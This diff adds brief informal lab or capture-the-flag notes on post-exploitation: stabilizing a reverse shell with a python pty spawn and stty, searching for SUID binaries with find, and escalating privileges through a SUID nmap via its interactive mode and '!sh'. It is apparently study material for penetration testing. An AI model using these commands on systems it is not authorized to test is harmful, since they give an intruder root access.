@@ -1,0 +1,30 @@
+Stabilize your shell:
+nb: target mut ave python2 or python3 installed
+
+    Import pty module and spawn bash shell:
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Press CTRL + Z to background process and get back to your host machine
+Use stty command to set terminal line settings and foreground back the target terminal:
+
+stty raw -echo; fg
+
+Set the terminal emulator to xterm:
+
+export TERM=xterm
+
+Press Enter
+
+
+
+pRIVESC
+find / -perm -u=s -type f 2>/dev/null
+we found an suid file
+/usr/local/bin/nmap
+
+searching through gtfobins we found this cmds for nmap privesc
+
+make it interactive
+/usr/local/bin/nmap --interactive
+!sh
